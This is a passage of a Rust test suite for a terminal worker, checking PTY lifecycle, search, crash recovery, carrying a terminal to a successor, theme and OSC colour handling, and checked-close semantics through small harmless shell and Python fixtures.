    // read keeps its admission permit while it is handled, so the queue
    // stays full whether or not the worker has taken it yet.
    let (reply, read) = crossbeam_channel::bounded(0);
    handle
        .try_command(Command::ReadViewport {
            offset: None,
            rows: None,
            reply,
        })
        .unwrap();
    let refused = std::iter::repeat_with(|| handle.scroll_to_bottom()).find_map(Result::err);
    assert_eq!(refused, Some(TerminalSendError::Full));
    assert!(
        wakes.try_recv().is_err(),
        "a hidden worker announced a frame"
    );

    handle.set_host_visibility(super::super::ipc::TerminalVisibility::Visible);
    read.recv_timeout(crate::test_timing::EVENTUALLY)
        .expect("the worker never read the viewport")
        .unwrap();
    wakes
        .recv_timeout(crate::test_timing::EVENTUALLY)
        .expect("the revealed worker published nothing");
    handle.shutdown().unwrap();
}

#[test]
fn accepted_search_is_not_lost_when_a_real_pty_completes() {
    for request in 0..8 {
        let handle = TerminalHandle::spawn(
            shell_session("printf 'retained-hit\\r\\n'; read line; exit 0"),
            TerminalConfig::default(),
            |_| {},
        )
        .unwrap();
        wait_for_text(&handle, "retained-hit");
        handle.input(b"\n").unwrap();
        handle.search(request, "retained-hit".into(), true).unwrap();
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        while !handle.is_completed() {
            assert!(std::time::Instant::now() < deadline);
            thread::sleep(Duration::from_millis(5));
        }
        assert!(handle.events().try_iter().any(|event| matches!(event, TerminalEvent::SearchResults { request: id, matches, .. } if id == request && matches.len() == 1)));
        handle.shutdown().unwrap();
    }
}

#[test]
fn completed_hidden_no_output_pty_uses_fresh_grid_metadata() {
    let handle = TerminalHandle::spawn(
        shell_session("exit 0"),
        TerminalConfig {
            initially_visible: false,
            columns: 17,
            rows: 4,
            ..TerminalConfig::default()
        },
        |_| {},
    )
    .unwrap();
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    while !handle.is_completed() {
        assert!(std::time::Instant::now() < deadline);
        thread::sleep(Duration::from_millis(5));
    }
    assert_eq!(handle.snapshot().columns, 17);
    assert_eq!(handle.snapshot().rows, 4);
    assert!(
        handle
            .snapshot()
            .lines
            .iter()
            .all(|row| row.cells.len() == 17)
    );
    handle.reveal().unwrap();
    handle.search(1, "missing".into(), false).unwrap();
    assert!(handle.events().try_iter().any(
        |event| matches!(event, TerminalEvent::SearchResults { matches, .. } if matches.is_empty())
    ));
    handle.shutdown().unwrap();
}

fn shell_session(script: &str) -> TerminalSession {
    let recipe = LaunchRecipe {
        unset_environment: Default::default(),
        program: "/bin/sh".into(),
        arguments: vec!["-c".into(), script.into()],
        working_directory: PathBuf::from("/"),
        environment: BTreeMap::new(),
    };
    TerminalSession {
        owned_codex_listener: None,
        recovery_origin: None,
        predecessor: None,
        id: crate::model::TerminalId::new(),
        launch: recipe.clone(),
        transcript_path: None,
        resume_hint: None,
        continuity: crate::model::TerminalContinuity::RelaunchAvailable {
            recipe,
            last_exit: None,
        },
    }
}

/// The handle's screen as text, once it shows `needle`.
fn wait_for_text(handle: &TerminalHandle, needle: &str) -> String {
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    loop {
        let snapshot = handle.snapshot();
        handle.acknowledge_redraw(snapshot.generation);
        let text = snapshot
            .lines
            .iter()
            .map(|line| {
                let row: String = line.cells.iter().map(|cell| cell.text.as_str()).collect();
                row.trim_end().to_owned()
            })
            .collect::<Vec<_>>()
            .join("\n");
        if text.contains(needle) {
            return text;
        }
        assert!(
            std::time::Instant::now() < deadline,
            "never showed {needle:?}:\n{text}"
        );
        thread::sleep(Duration::from_millis(10));
    }
}

#[test]
fn completed_worker_survives_two_daemon_crashes_without_relaunching() {
    const FIXTURE: &str = "CAGENTS_COMPLETED_WORKER_FIXTURE";
    const STAGE: &str = "CAGENTS_COMPLETED_WORKER_STAGE";
    if let Some(directory) = std::env::var_os(FIXTURE) {
        let directory = PathBuf::from(directory);
        let stage = std::env::var(STAGE).unwrap();
        let paths = crate::daemon::RuntimePaths::discover().unwrap();
        let proof = crate::model::HostSessionProof {
            host_session_id: crate::model::HostSessionId::new(format!("worker-{stage}")),
            boot_id: crate::daemon::read_boot_id().unwrap(),
            host_incarnation: crate::model::HostIncarnation::new(format!("worker-{stage}")),
        };
        let _lease = crate::daemon::HostLease::acquire(&paths, &proof).unwrap();
        let holders = paths.directory.join("holders");
        let (mut recovery, adoption) = if stage == "0" {
            let mut source = shell_session(
                "echo launched >> \"$LAUNCH_COUNT\"; echo completed-worker-result; exit 7",
            );
            source.launch.environment.insert(
                "LAUNCH_COUNT".into(),
                directory.join("launches").to_string_lossy().into_owned(),
            );
            (
                crate::terminal::holder::Recovery {
                    source,
                    previous_sources: Vec::new(),
                    relaunches: Vec::new(),
                    options: crate::terminal::TerminalSpawnOptions::default(),
                    execution_environment: None,
                    execution_recipe: None,
                },
                None,
            )
        } else {
            let records = crate::terminal::holder::discover(&holders, &proof.boot_id).unwrap();
            assert_eq!(records.len(), 1);
            let socket = crate::terminal::holder::socket(&holders, records[0].terminal);
            let (mut recovery, lost) = holder::inspect(&socket, &records[0], &proof).unwrap();
            assert!(
                !lost,
                "a completed parser saved its final screen before the crash"
            );
            recovery.previous_sources.push(recovery.source.clone());
            (recovery, Some(socket))
        };
        recovery.source.continuity = crate::model::TerminalContinuity::DetachedSameBoot {
            host_session_id: proof.host_session_id,
            boot_id: proof.boot_id,
            host_incarnation: proof.host_incarnation,
        };
        let handle = TerminalHandle::spawn(
            recovery.source.clone(),
            TerminalConfig {
                holder_recovery: Some(recovery),
                adoption,
                ..TerminalConfig::default()
            },
            |_| {},
        )
        .unwrap();
        wait_for_text(&handle, "completed-worker-result");
        let deadline = Instant::now() + Duration::from_secs(10);
        while !handle.is_completed() {
            assert!(Instant::now() < deadline, "worker did not finish");
            thread::sleep(Duration::from_millis(10));
        }
        assert!(
            handle
                .events()
                .try_iter()
                .any(|event| matches!(event, TerminalEvent::Completed { exit_code: 7, .. }))
        );
        assert!(
            handle
                .inner
                .published
                .retained_holder
                .lock()
                .unwrap()
                .is_some()
        );
        assert_eq!(
            fs::read_to_string(directory.join("launches")).unwrap(),
            "launched\n"
        );
        if stage == "1" {
            // Failed restore cleanup can race a worker that has already
            // completed. Its disconnected command path still joins and
            // preserves the final holder instead of releasing it.
            handle.preserve_for_restart().unwrap();
        }
        if stage == "2" {
            handle.shutdown().unwrap();
            assert!(
                crate::terminal::holder::discover(
                    &holders,
                    &crate::daemon::read_boot_id().unwrap()
                )
                .unwrap()
                .is_empty()
            );
            return;
        }
        fs::write(directory.join(format!("ready-{stage}")), "ready").unwrap();
        loop {
            thread::park();
        }
    }

    struct Cleanup {
        daemon: Option<std::process::Child>,
        records: Vec<crate::terminal::holder::Record>,
    }
    impl Drop for Cleanup {
        fn drop(&mut self) {
            if let Some(child) = self.daemon.as_mut() {
                let _ = child.kill();
                let _ = child.wait();
            }
            for record in &self.records {
                if record.holder.is_current() {
                    // Exact start identity was checked, and this test alone owns the holder.
                    unsafe {
                        libc::kill(record.holder.pid, libc::SIGKILL);
                    }
                }
            }
        }
    }
    let directory = tempdir().unwrap();
    let holders = directory
        .path()
        .join(crate::instance::runtime_subdirectory())
        .join("holders");
    let mut cleanup = Cleanup {
        daemon: None,
        records: Vec::new(),
    };
    for stage in 0..3 {
        cleanup.daemon = Some(std::process::Command::new(std::env::current_exe().unwrap())
            .args(["--exact", "terminal::worker::tests::completed_worker_survives_two_daemon_crashes_without_relaunching", "--nocapture"])
            .env_clear().env("PATH", "/usr/bin:/bin").env("HOME", directory.path())
            .env("XDG_RUNTIME_DIR", directory.path()).env(FIXTURE, directory.path())
            .env(STAGE, stage.to_string()).spawn().unwrap());
        let deadline = Instant::now() + Duration::from_secs(15);
        if stage == 2 {
            loop {
                if let Some(status) = cleanup.daemon.as_mut().unwrap().try_wait().unwrap() {
                    assert!(status.success());
                    break;
                }
                assert!(
                    Instant::now() < deadline,
                    "completed cleanup did not finish"
                );
                thread::sleep(Duration::from_millis(10));
            }
        } else {
            while !directory.path().join(format!("ready-{stage}")).exists() {
                assert!(
                    cleanup
                        .daemon
                        .as_mut()
                        .unwrap()
                        .try_wait()
                        .unwrap()
                        .is_none()
                );
                assert!(
                    Instant::now() < deadline,
                    "completed worker did not become ready"
                );
                thread::sleep(Duration::from_millis(10));
            }
            let records = crate::terminal::holder::discover(
                &holders,
                &crate::daemon::read_boot_id().unwrap(),
            )
            .unwrap();
            assert_eq!(records.len(), 1);
            if stage == 0 {
                cleanup.records = records.clone();
            }
            assert_eq!(records[0], cleanup.records[0]);
            cleanup.daemon.as_mut().unwrap().kill().unwrap();
            cleanup.daemon.as_mut().unwrap().wait().unwrap();
        }
        cleanup.daemon = None;
    }
    assert_eq!(
        fs::read_to_string(directory.path().join("launches")).unwrap(),
        "launched\n"
    );
    assert!(
        crate::terminal::holder::discover(&holders, &crate::daemon::read_boot_id().unwrap())
            .unwrap()
            .is_empty()
    );
}

#[test]
fn a_carried_terminal_keeps_its_process_and_screen_for_a_successor() {
    let directory = tempdir().unwrap();
    let socket = directory.path().join("holder.sock");
    let session = shell_session(
        "printf '\\033]2;carried title\\007'; echo before; \
             read line; echo \"after:$line\"; read line",
    );
    let first = TerminalHandle::spawn(session.clone(), TerminalConfig::default(), |_| {}).unwrap();
    let before = wait_for_text(&first, "before");
    let carried = first.carry(socket.clone()).unwrap();
    assert_eq!(carried.size.columns, TerminalConfig::default().columns);
    // The worker is gone; the terminal's process is not.
    assert!(first.is_completed());
    assert!(first.input("lost?").is_err());

    let config = TerminalConfig {
        adoption: Some(socket.clone()),
        ..TerminalConfig::default()
    };
    let second = TerminalHandle::spawn(session, config, |_| {}).unwrap();
    assert_eq!(wait_for_text(&second, "before"), before);
    second.input(b"hello\n".to_vec()).unwrap();
    wait_for_text(&second, "after:hello");
    let events: Vec<_> = second.events().try_iter().collect();
    assert!(
        events.contains(&TerminalEvent::TitleChanged("carried title".into())),
        "{events:?}"
    );
    assert!(!socket.exists());
    second.shutdown().unwrap();
}

#[test]
fn a_terminal_that_cannot_be_carried_keeps_running_here() {
    let directory = tempdir().unwrap();
    let session = shell_session("echo before; read line; echo \"after:$line\"; read line");
    let handle = TerminalHandle::spawn(session, TerminalConfig::default(), |_| {}).unwrap();
    wait_for_text(&handle, "before");
    let unreachable = directory.path().join("missing").join("holder.sock");
    assert!(handle.carry(unreachable).is_err());
    assert!(!handle.is_completed());
    handle.input(b"still here\n".to_vec()).unwrap();
    wait_for_text(&handle, "after:still here");
    handle.shutdown().unwrap();
}

#[test]
fn omp_display_title_drops_lifecycle_animation_but_preserves_labels() {
    use crate::agent::{Activity, Provider};
    let title = |value: &str| {
        canonical_agent_title(
            value,
            Provider::Omp
                .activity_from_title(value)
                .map(|state| Activity {
                    provider: Provider::Omp,
                    state,
                }),
        )
    };
    assert_eq!(title("π ⠋ project"), title("π ⠙ project"));
    assert_eq!(title("π > project"), "π project");
    assert_eq!(title("π ! renamed"), "π renamed");
    assert_eq!(title("custom title"), "custom title");
    assert_eq!(canonical_agent_title("π ⠋ project", None), "π ⠋ project");
}

#[test]
fn changing_parser_theme_preserves_truecolor_and_osc_overrides_and_queries() {
    let mut terminal = Terminal::new(TerminalOptions {
        cols: 8,
        rows: 2,
        max_scrollback: 0,
    })
    .unwrap();
    let replies = Rc::new(RefCell::new(Vec::new()));
    terminal
        .on_pty_write({
            let replies = Rc::clone(&replies);
            move |_, bytes| replies.borrow_mut().extend_from_slice(bytes)
        })
        .unwrap();
    apply_theme(&mut terminal, TerminalTheme::Dark).unwrap();
    terminal.vt_write(b"\x1b[38;2;18;52;86mT\x1b[0mD\x1b[31mR\x1b[0m");
    let mut visual = VisualResources::new().unwrap();
    let dark = visual.capture(&terminal, 1, true, None).unwrap().unwrap();
    terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
    let dark_queries = std::mem::take(&mut *replies.borrow_mut());
    apply_theme(&mut terminal, TerminalTheme::Light).unwrap();
    let light = visual.capture(&terminal, 2, true, None).unwrap().unwrap();
    assert_eq!(
        dark.lines[0].cells[0].foreground,
        light.lines[0].cells[0].foreground
    );
    assert_ne!(
        dark.lines[0].cells[1].foreground,
        light.lines[0].cells[1].foreground
    );
    assert_ne!(
        dark.lines[0].cells[2].foreground,
        light.lines[0].cells[2].foreground
    );
    terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
    let light_queries = std::mem::take(&mut *replies.borrow_mut());
    assert!(!light_queries.is_empty());
    assert_ne!(dark_queries, light_queries);
    terminal.vt_write(b"\x1b]10;#123456\x07\x1b]11;#345678\x07\x1b]4;1;#56789a\x07");
    terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
    let overridden = std::mem::take(&mut *replies.borrow_mut());
    apply_theme(&mut terminal, TerminalTheme::SolarizedDark).unwrap();
    terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
    assert_eq!(*replies.borrow(), overridden);
    terminal.vt_write(b"\x1b]110\x07\x1b]111\x07\x1b]104;1\x07");
    assert_eq!(
        terminal.fg_color().unwrap(),
        terminal.default_fg_color().unwrap()
    );
    assert_eq!(
        terminal.bg_color().unwrap(),
        terminal.default_bg_color().unwrap()
    );
    assert_eq!(
        terminal.color_palette().unwrap().get(PaletteIndex::RED),
        terminal
            .default_color_palette()
            .unwrap()
            .get(PaletteIndex::RED)
    );
}

fn capture_worker() -> (Worker, Receiver<TerminalEvent>) {
    let recipe = LaunchRecipe {
        unset_environment: Default::default(),
        program: "/bin/true".into(),
        arguments: Vec::new(),
        working_directory: PathBuf::from("/"),
        environment: BTreeMap::new(),
    };
    capture_worker_for(recipe)
}

fn capture_worker_for(recipe: LaunchRecipe) -> (Worker, Receiver<TerminalEvent>) {
    capture_worker_with(recipe, TerminalConfig::default())
}

fn capture_worker_with(
    recipe: LaunchRecipe,
    config: TerminalConfig,
) -> (Worker, Receiver<TerminalEvent>) {
    let session = TerminalSession {
        owned_codex_listener: None,
        recovery_origin: None,
        predecessor: None,
        id: crate::model::TerminalId::new(),
        launch: recipe.clone(),
        transcript_path: None,
        resume_hint: None,
        continuity: crate::model::TerminalContinuity::RelaunchAvailable {
            recipe,
            last_exit: None,
        },
    };
    let (_tx, commands) = command_channel(1);
    let (events, receiver) = crossbeam_channel::unbounded();
    let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
    (
        Worker::start(session, config, None, commands, events, published)
            .unwrap()
            .0,
        receiver,
    )
}

#[test]
fn terminal_handle_exposes_only_the_live_original_launch_pin_and_clones_keep_it_open() {
    let directory = tempfile::tempdir().unwrap();
    let original = directory.path().join("launch");
    let moved = directory.path().join("moved");
    std::fs::create_dir(&original).unwrap();
    let recipe = LaunchRecipe {
        program: "/bin/sh".into(),
        arguments: vec!["-c".into(), "echo PIN_HANDLE_READY; read line".into()],
        working_directory: original.clone(),
        environment: BTreeMap::new(),
        unset_environment: Default::default(),
    };
    let session = TerminalSession {
        owned_codex_listener: None,
        recovery_origin: None,
        predecessor: None,
        id: TerminalId::new(),
        launch: recipe.clone(),
        transcript_path: None,
        resume_hint: None,
        continuity: crate::model::TerminalContinuity::RelaunchAvailable {
            recipe,
            last_exit: None,
        },
    };
    let handle = TerminalHandle::spawn(session, TerminalConfig::default(), |_| {}).unwrap();
    // Startup success itself guarantees installation; no later path lookup.
    let (identity, file) = handle.pinned_launch_directory().unwrap();
    wait_for_text(&handle, "PIN_HANDLE_READY");
    std::fs::rename(&original, &moved).unwrap();
    std::fs::create_dir(&original).unwrap();
    let (again, cloned) = handle.pinned_launch_directory().unwrap();
    assert_eq!(again, identity);
    assert!(Arc::ptr_eq(&file, &cloned));
    assert_ne!(
        crate::agent_execution::DirectoryIdentity::from_metadata(
            &std::fs::metadata(&original).unwrap()
        ),
        identity
    );
    assert_ne!(
        unsafe { libc::fcntl(file.as_raw_fd(), libc::F_GETFD) } & libc::FD_CLOEXEC,
        0
    );
    handle.input(b"\n").unwrap();
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    while !handle.is_completed() {
        assert!(std::time::Instant::now() < deadline);
        thread::sleep(Duration::from_millis(10));
    }
    assert!(handle.pinned_launch_directory().is_err());
    handle.shutdown().unwrap();
    drop(handle);
    drop(cloned);
    assert_eq!(
        crate::agent_execution::DirectoryIdentity::from_metadata(&file.metadata().unwrap()),
        identity
    );
}

#[test]
fn launch_pin_refuses_kernel_exit_before_worker_completion_publication() {
    let (mut worker, events) = capture_worker_for(LaunchRecipe {
        program: "/bin/sh".into(),
        arguments: vec!["-c".into(), "read line; echo ROOT_EXIT_DONE".into()],
        working_directory: PathBuf::from("/"),
        environment: BTreeMap::new(),
        unset_environment: Default::default(),
    });
    let (commands, receiver) = command_channel(1);
    worker.commands = receiver;
    let handle = TerminalHandle {
        inner: Arc::new(HandleInner {
            commands,
            events,
            published: Arc::clone(&worker.published),
            worker: joins::JoinOwner::empty(Arc::clone(&worker.published)),
        }),
    };
    assert!(handle.pinned_launch_directory().is_ok());
    let (_, original) = handle.inner.published.launch_directory.get().unwrap();
    assert_ne!(
        unsafe { libc::fcntl(original.as_raw_fd(), libc::F_GETFD) } & libc::FD_CLOEXEC,
        0
    );
    // The actual event loop is deliberately not running. The shell exits
    // naturally while its queued exit report cannot publish Completed.
    worker.writer.write_all(b"continue\n").unwrap();
    assert!(worker.child.exited_within(Duration::from_secs(5)).unwrap());
    assert!(!handle.is_completed());
    assert!(
        !handle
            .inner
            .published
            .shutdown_requested
            .load(Ordering::Acquire)
    );
    assert!(
        handle
            .pinned_launch_directory()
            .unwrap_err()
            .contains("original root")
    );
    worker.run();
    assert!(handle.is_completed());
    assert!(handle.shutdown().is_ok());
}

#[test]
fn checked_close_reconciles_queued_natural_root_exit() {
    use super::super::ipc::TerminalCloseResult;

    // Own the actual worker without starting its event loop. The shell
    // blocks until its original root identity and PTY have been captured.
    let (worker, events) = capture_worker_for(LaunchRecipe {
        program: "/bin/sh".into(),
        arguments: vec![
            "-c".into(),
            "read line; printf 'CLOSE_FINAL_OUTPUT\\n'; exit 7".into(),
        ],
        working_directory: PathBuf::from("/"),
        environment: BTreeMap::new(),
        unset_environment: Default::default(),
    });
    struct Cleanup(Option<Worker>);
    impl Drop for Cleanup {
        fn drop(&mut self) {
            if let Some(worker) = &self.0 {
                // Failure before run() still releases this exact owned
                // root through its pidfd. The fixture starts no children.
                let _ = worker.child.force_kill();
            }
        }
    }
    let mut cleanup = Cleanup(Some(worker));
    let worker = cleanup.0.as_mut().unwrap();
    assert!(worker.child_identity.is_some());
    let (commands, receiver) = command_channel(1);
    worker.commands = receiver;
    let handle = TerminalHandle {
        inner: Arc::new(HandleInner {
            commands,
            events,
            published: Arc::clone(&worker.published),
            worker: joins::JoinOwner::empty(Arc::clone(&worker.published)),
        }),
    };

    worker.writer.write_all(b"release\n").unwrap();
    // This is the holder's real report, sent only after it reaped the
    // original root. Relay the same value rather than inventing an exit.
    let report = worker
        .child_exit_rx
        .recv_deadline(Instant::now() + Duration::from_secs(5))
        .unwrap();
    assert_eq!(report.as_ref().unwrap().exit_code(), 7);
    assert!(!worker.child.unreaped());
    assert!(!handle.is_completed());
    let (relay, original_exit) = crossbeam_channel::bounded(1);
    relay.send(report).unwrap();
    worker.child_exit_rx = original_exit;
    let (reply, outcome) = crossbeam_channel::bounded(1);
    handle
        .try_command(Command::CloseChecked {
            allow_active: true,
            deadline: Instant::now() + Duration::from_secs(5),
            reply,
        })
        .unwrap();
    assert!(
        handle
            .inner
            .published
            .priority_close
            .lock()
            .unwrap()
            .is_some()
    );

    // Production takes priority_close before its pending ChildExit. The
    // root is already reaped, but its output and completion are not yet
    // consumed. Checked close must reconcile that real pending exit.
    cleanup.0.take().unwrap().run();
    let closed = outcome.recv_deadline(Instant::now() + Duration::from_secs(1));
    let completed = handle.is_completed();
    let final_screen = handle.snapshot();
    let final_events: Vec<_> = handle.events().try_iter().collect();
    // Drop the completed worker's retained holder before asserting the
    // old failing result, so a red regression leaves no fixture process.
    drop(handle);
    drop(cleanup);

    assert!(
        completed,
        "actual exit and PTY drain must complete teardown"
    );
    assert!(final_screen.lines.iter().any(|line| {
        line.cells
            .iter()
            .map(|cell| cell.text.as_str())
            .collect::<String>()
            .contains("CLOSE_FINAL_OUTPUT")
    }));
    assert_eq!(
        final_events
            .iter()
            .filter(|event| matches!(
                event,
                TerminalEvent::Completed {
                    exit_code: 7,
                    signal: None,
                    intentional: false,
                }
            ))
            .count(),
        1,
        "close must preserve the actual unintentional exit result"
    );
    assert!(
        matches!(closed, Ok(TerminalCloseResult::Closed)),
        "the original root's queued natural exit must be reconciled: {closed:?}"
    );
}

#[test]
fn deferred_close_requires_the_actual_exit_report_and_pty_eof() {
    use super::super::ipc::TerminalCloseResult;

    // Withhold a real report, withhold real EOF, then lose the report
    // channel. No case invents a process status or a PTY completion.
    for missing in 0..3 {
        let (mut worker, events) = capture_worker_for(LaunchRecipe {
            program: "/bin/sh".into(),
            arguments: vec!["-c".into(), "read line; printf 'drained'; exit 7".into()],
            working_directory: "/".into(),
            environment: Default::default(),
            unset_environment: Default::default(),
        });
        let (commands, receiver) = command_channel(1);
        worker.commands = receiver;
        let handle = TerminalHandle {
            inner: Arc::new(HandleInner {
                commands,
                events,
                published: worker.published.clone(),
                worker: joins::JoinOwner::empty(worker.published.clone()),
            }),
        };
        worker.writer.write_all(b"release\n").unwrap();
        let report = worker
            .child_exit_rx
            .recv_deadline(Instant::now() + Duration::from_secs(5))
            .unwrap();
        assert_eq!(report.as_ref().unwrap().exit_code(), 7);
        assert!(!worker.child.unreaped());
        let (exit_relay, exits) = crossbeam_channel::bounded(1);
        worker.child_exit_rx = exits;
        let mut withheld_report = Some(report);
        if missing == 1 {
            exit_relay.send(withheld_report.take().unwrap()).unwrap();
        }
        let mut messages = Vec::new();
        loop {
            let message = worker
                .pty_rx
                .recv_deadline(Instant::now() + Duration::from_secs(5))
                .unwrap();
            let eof = matches!(message, PtyMessage::Eof);
            assert!(
                eof || matches!(message, PtyMessage::Bytes(_)),
                "unexpected fixture PTY error"
            );
            messages.push(message);
            if eof {
                break;
            }
        }
        let (pty_relay, pty) = crossbeam_channel::bounded(messages.len() + 1);
        let mut withheld_eof = None;
        for message in messages {
            if missing == 1 && matches!(message, PtyMessage::Eof) {
                withheld_eof = Some(message);
            } else {
                pty_relay.send(message).unwrap();
            }
        }
        worker.pty_rx = pty;
        let exit_relay = (missing != 2).then_some(exit_relay);
        // For the lost-channel case, dropping the real report sender is
        // evidence of failure; the held successful report is not reused.
        let withheld_report = (missing == 0).then_some(withheld_report).flatten();
        let deadline = Instant::now() + Duration::from_millis(100);
        let (reply, outcome) = crossbeam_channel::bounded(1);
        handle
            .try_command(Command::CloseChecked {
                allow_active: true,
                deadline,
                reply,
            })
            .unwrap();
        let observer = handle.clone();
        let (refusal, was_completed, fence_released, received_at) = thread::scope(|scope| {
            let release = scope.spawn(move || {
                let refusal = outcome.recv_deadline(deadline + Duration::from_secs(5));
                let received_at = Instant::now();
                let was_completed = observer.is_completed();
                let fence_released = !observer.inner.published.input_order.lock().unwrap().handoff;
                // Always release the actual held fact before assertions,
                // including if an incorrect implementation replied early.
                if let Some(report) = withheld_report {
                    let _ = exit_relay.unwrap().send(report);
                }
                if let Some(eof) = withheld_eof {
                    let _ = pty_relay.send(eof);
                }
                (refusal, was_completed, fence_released, received_at)
            });
            worker.run();
            release.join().unwrap()
        });
        let completed = handle.is_completed();
        let events: Vec<_> = handle.events().try_iter().collect();
        drop(handle);
        assert!(
            matches!(refusal, Ok(TerminalCloseResult::Unknown(_))),
            "{refusal:?}"
        );
        assert!(!was_completed, "neither missing fact permits completion");
        assert!(
            fence_released,
            "a refused natural close must restore its own admission fence"
        );
        if missing < 2 {
            assert!(
                received_at >= deadline,
                "the request retained its original deadline"
            );
            assert!(
                completed,
                "releasing both actual facts permits natural completion"
            );
        } else {
            assert!(
                !completed,
                "a disconnected report cannot certify the root's result"
            );
            assert!(
                !events
                    .iter()
                    .any(|event| matches!(event, TerminalEvent::Completed { .. }))
            );
        }
    }
}

#[test]
fn natural_close_cannot_replace_a_sealed_destructive_close_obligation() {
    let (mut worker, events) = capture_worker_for(LaunchRecipe {
        program: "/bin/sh".into(),
        arguments: vec!["-c".into(), "read line; exit 7".into()],
        working_directory: "/".into(),
        environment: Default::default(),
        unset_environment: Default::default(),
    });
    worker.writer.write_all(b"release\n").unwrap();
    let report = worker
        .child_exit_rx
        .recv_deadline(Instant::now() + Duration::from_secs(5))
        .unwrap();
    assert_eq!(report.as_ref().unwrap().exit_code(), 7);
    let (relay, exits) = crossbeam_channel::bounded(1);
    relay.send(report).unwrap();
    worker.child_exit_rx = exits;
    // This state represents an outstanding family-kill proof. Even a
    // readable original pidfd cannot select the reversible natural route.
    worker.published.input_order.lock().unwrap().cleanup_sealed = true;
    worker.checked_close_started = true;
    let result = worker.begin_checked_close(true, Instant::now() + Duration::from_secs(1), true);
    let (_commands, inbox) = command_channel(1);
    worker.commands = inbox;
    let published = worker.published.clone();
    worker.run();
    assert!(matches!(
        result,
        CheckedClose::Finished(super::super::ipc::TerminalCloseResult::Unknown(_))
    ));
    assert!(!published.completed.load(Ordering::Acquire));
    assert!(matches!(
        *published.archive.lock().unwrap(),
        ArchivePhase::Live
    ));
    assert!(
        !events
            .try_iter()
            .any(|event| matches!(event, TerminalEvent::Completed { .. }))
    );
}

#[test]
fn proven_checked_shutdown_does_not_require_natural_pty_eof() {
    let (mut worker, events) = capture_worker_for(LaunchRecipe {
        program: "/bin/sh".into(),
        arguments: vec!["-c".into(), "read line".into()],
        working_directory: "/".into(),
        environment: Default::default(),
        unset_environment: Default::default(),
    });
    // Perform the actual frozen family kill. Neither the request nor the
    // input seal may manufacture its successful cleanup proof.
    let result = worker.begin_checked_close(true, Instant::now() + Duration::from_secs(5), true);
    let proved = worker.checked_shutdown && worker.checked_close_started;
    let (_pty, messages) = crossbeam_channel::bounded(1);
    worker.pty_rx = messages;
    let published = worker.published.clone();
    published.request_shutdown();
    worker.run();
    assert!(matches!(
        result,
        CheckedClose::Finished(super::super::ipc::TerminalCloseResult::Closed)
    ));
    assert!(proved && published.completed.load(Ordering::Acquire));
    assert_eq!(
        events
            .try_iter()
            .filter(|event| matches!(
                event,
                TerminalEvent::Completed {
                    intentional: true,
                    signal: Some(_),
                    ..
                }
            ))
            .count(),
        1
    );
}

#[test]
fn deferred_close_fences_older_input_during_final_query_backpressure() {
    if !std::path::Path::new("/usr/bin/python3").exists() {
        return;
    }
    for backpressured in [false, true] {
        let accepted = vec![
            b'x';
            if backpressured {
                admission::ORDINARY_BYTES
            } else {
                8
            }
        ];
        let script = format!(
            r#"
import os, select, signal, time, tty
tty.setraw(0)
# The session leader's exit must leave this fixture's PTY reader alive.
signal.signal(signal.SIGHUP, signal.SIG_IGN)
if os.fork(): os._exit(7)
os.write(1, b'\x1b[6n' * 64 + b'QUERY_FLOOD_END')
remaining = {size}
deadline = time.monotonic() + 5
while remaining and time.monotonic() < deadline:
    if not select.select([0], [], [], max(0, deadline-time.monotonic()))[0]: break
    data = os.read(0, min(remaining, 65536))
    if not data: break
    remaining -= len(data)
os.write(1, b'QUERY_READER_DONE')
os._exit(0)
"#,
            size = accepted.len()
        );
        let (mut worker, events) = capture_worker_for(LaunchRecipe {
            program: "/usr/bin/python3".into(),
            arguments: vec!["-c".into(), script],
            working_directory: "/".into(),
            environment: Default::default(),
            unset_environment: Default::default(),
        });
        let (_commands, inbox) = command_channel(1);
        worker.commands = inbox;
        let report = worker
            .child_exit_rx
            .recv_deadline(Instant::now() + Duration::from_secs(5))
            .unwrap();
        assert_eq!(report.as_ref().unwrap().exit_code(), 7);
        let (relay, exits) = crossbeam_channel::bounded(1);
        relay.send(report).unwrap();
        worker.child_exit_rx = exits;
        let storage = worker
            .published
            .input_storage
            .reserve(accepted.len(), 1)
            .unwrap();
        assert!(worker.pending_input.admit_bytes(
            &accepted,
            true,
            Some(admission::Permit::generated(storage))
        ));
        let deadline = Instant::now() + Duration::from_millis(200);
        let (reply, outcome) = crossbeam_channel::bounded(1);
        assert!(!worker.handle_command(Command::CloseChecked {
            allow_active: true,
            deadline,
            reply
        }));
        assert!(worker.natural_close.is_some());
        // These are real final VT queries from the surviving PTY child.
        // Reply admission must not flush older user input behind the fence.
        let mut final_queries = Vec::new();
        while !final_queries.ends_with(b"QUERY_FLOOD_END") {
            match worker
                .pty_rx
                .recv_deadline(deadline + Duration::from_secs(5))
                .unwrap()
            {
                PtyMessage::Bytes(bytes) => final_queries.extend_from_slice(&bytes),
                other => panic!("query child ended before its real query batch: {other:?}"),
            }
        }
        worker.process_output(final_queries);
        let prefix_preserved = worker.pending_input.front() == accepted;
        let writer_failed = worker.writer_failed;
        let blocked = worker.reply_pending();
        let retained_replies = worker
            .effects
            .borrow()
            .ordered
            .iter()
            .filter(|effect| matches!(effect, Effect::PtyWrite(_)))
            .count();
        let published = worker.published.clone();
        if !backpressured {
            // Release this test's reversible request so the child's actual
            // read and EOF also settle before any assertion can fail.
            worker.refuse_natural_close();
        }
        worker.run();
        let refusal = outcome.recv_timeout(Duration::from_secs(1));
        assert!(matches!(
            refusal,
            Ok(super::super::ipc::TerminalCloseResult::Unknown(_))
        ));
        assert!(
            prefix_preserved && !writer_failed,
            "a parser reply flushed older user input"
        );
        if backpressured {
            assert!(blocked && retained_replies > 0 && retained_replies <= 64);
            assert!(
                Instant::now() >= deadline,
                "reply backpressure must retain the original deadline"
            );
        }
        assert!(published.completed.load(Ordering::Acquire));
        assert!(events.try_iter().any(|event| matches!(
            event,
            TerminalEvent::Completed {
                exit_code: 7,
                signal: None,
                intentional: false
            }
        )));
    }
}

#[test]
